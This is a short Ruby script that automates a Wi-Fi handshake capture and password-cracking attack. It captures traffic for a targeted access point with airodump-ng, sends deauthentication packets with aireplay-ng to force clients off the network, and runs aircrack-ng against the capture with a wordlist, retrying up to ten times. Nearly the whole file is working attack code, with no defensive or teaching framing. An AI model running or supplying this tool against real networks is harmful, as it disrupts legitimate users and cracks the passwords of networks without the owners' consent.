require_relative 'monitoring_stopper'
require_relative 'cleaner'
#Hanshake capture

def aireplay_runner stations = Array.new
	
	if stations[0].nil?
		abort("Error: No stations found")
		
	end
	
	counter = 1
	begin
	
		if counter == 10
			cleaner()
			puts "Hanshake timed out! (#{counter} tries)"
			return -1
		end
	
		again = false	
		cleaner()

		s = stations.sample

		p = IO.popen("sudo airodump-ng mon0 --bssid #{s.bssid} -c #{s.channel} -w replay --ivs")


		fork do 
			sleep(0.5)
			2.times do
				if !system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0")
					monitoring_stopper()
					#cleaner()
					abort("\nAttack fail!")
				end
				sleep(2)
			end
		end


		pid = p.pid
		n = 5
		sleep(n)
		Process.kill("INT", pid)

		if !system("sudo aircrack-ng -w pass.lst replay-01.ivs")
			abort("\nCracker fail!")
		else
			a = `sudo aircrack-ng -w pass.lst replay-01.ivs`
		end

		if a =~ /no data packets/
			again = true
		end
		
		counter += 1

	end while again
	
end


